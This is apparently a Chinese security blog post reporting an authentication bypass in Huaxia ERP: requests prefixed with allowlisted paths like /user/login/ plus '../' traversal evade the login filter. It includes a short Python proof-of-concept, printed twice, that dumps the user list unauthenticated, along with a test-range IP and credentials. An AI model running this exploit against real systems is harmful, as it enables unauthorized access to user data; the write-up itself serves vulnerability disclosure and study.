> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-g7qxNoS-oa_mqh_msmaag)

继续这个测试靶场。。

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="132" valign="top"><p>靶场地址</p></td><td width="421" colspan="2" valign="top"><p>http://47.116.69.14</p></td></tr><tr><td width="132" valign="top"><p>账户密码</p></td><td width="210" valign="top"><p><strong>jsh</strong></p></td><td width="210" valign="top"><p><strong>123456</strong></p></td></tr></tbody></table>

**1、描述**

  

华夏 ERP 基于 SpringBoot 框架和 SaaS 模式，可以算作是国内人气比较高的一款 ERP 项目，但经过源码审计发现其存在多个漏洞，本篇为第二处授权绕过漏洞。

  

  

  

  

  

**2、影响范围**

  

华夏 ERP  

  

  

  

  

  

**3、漏洞复现**

  

从开源项目本地搭建来进行审计，源码下载地址：

百度网盘 https://pan.baidu.com/s/1jlild9uyGdQ7H2yaMx76zw  提取码: 814g  

  

  

  

  

  

漏洞复现：

1、漏洞代码位置，利用 filter 做登录判断

```
com.jsh.erp.filter.LogCostFilter
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAHZf0xlShnFVN9xMZdhQHyiavcXdedib1vGxecoxdo6Pk2jY5kibOXtU4zyA095RMCYX45WNgMYVwbQ/640?wx_fmt=png)

如果 URL 开头匹配到了 allowUrls 中的内容则不跳转登录界面

追踪一下 allowUrls 的值：

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAHZf0xlShnFVN9xMZdhQHyHh4byXb6DibHEo7bwqC6WNSV1eHuIiahMwb4pn47iaB7gbzrapWI6pdKQ/640?wx_fmt=png)

```
[“/user/login”,”/user/registerUser”]
```

```
python3 华夏ERP授权绕过2.py http://ip:port
```

下面我们需要将 url 开头设置为数组中的内容即可：

就比如 / user/login/  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAHZf0xlShnFVN9xMZdhQHy3icskL9Brzhyicw14IhNtKypGbym1k8j889U8rTgWsiaziaXaepb2Y2z0g/640?wx_fmt=png)

或者设置为 / user/registerUser/

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAHZf0xlShnFVN9xMZdhQHyElwRHr1ZdEsibsVBNmdeaYw8iaYDI68hytnLhNibc72IlF8QoCAnwQBYQ/640?wx_fmt=png)

POC

使用方法：

```
import sys,requests

def main(ip):
    url = "{ip}/user/login/../../user/getUserList?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D¤tPage=1&pageSize=15".format(ip=ip)
    res = requests.get(url,verify=False,timeout=5)
    if res.status_code == 200:
        print("+ {ip} 访问成功\n{data}".format(ip=ip,data=res.text))
main(sys.argv[1])
```

源码：

```
import sys,requests
def main(ip):
    url = "{ip}/user/login/../../user/getUserList?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D¤tPage=1&pageSize=15".format(ip=ip)
    res = requests.get(url,verify=False,timeout=5)
    if res.status_code == 200:
        print("+ {ip} 访问成功\n{data}".format(ip=ip,data=res.text))
main(sys.argv[1])
```

最后再给大家介绍一下漏洞库，地址：wiki.xypbk.com  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1GjZWV69BXhbVdDPh2GNcQzoTyXn20iaOhsIGsxPPicJz6u7Rkq5weKmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1vUPmy8nUyUcxBicqJEtxo3ib4YzTQQEWd5cotecmuB0pZy4AKgAdhapg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1SjnVpDzicoVx6nMShk1Ou1jtKYYicsvNHt3DCWZnM5bvTnW56wcFwD9Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1Hxk0rhBSk7Oib2ZiafD0w9T9YBDffv171WjmnvFxlktv5UZiahYwytZ7w/640?wx_fmt=png)

本站暂不开源，因为想控制影响范围，若因某些人乱搞，造成了严重后果，本站将即刻关闭。

漏洞库内容来源于互联网 && 零组文库 &&peiqi 文库 && 自挖漏洞 && 乐于分享的师傅，供大家方便检索，绝无任何利益。  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

若有愿意分享自挖漏洞的佬师傅请公众号后台留言，本站将把您供上，并在此署名，天天烧香那种！

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看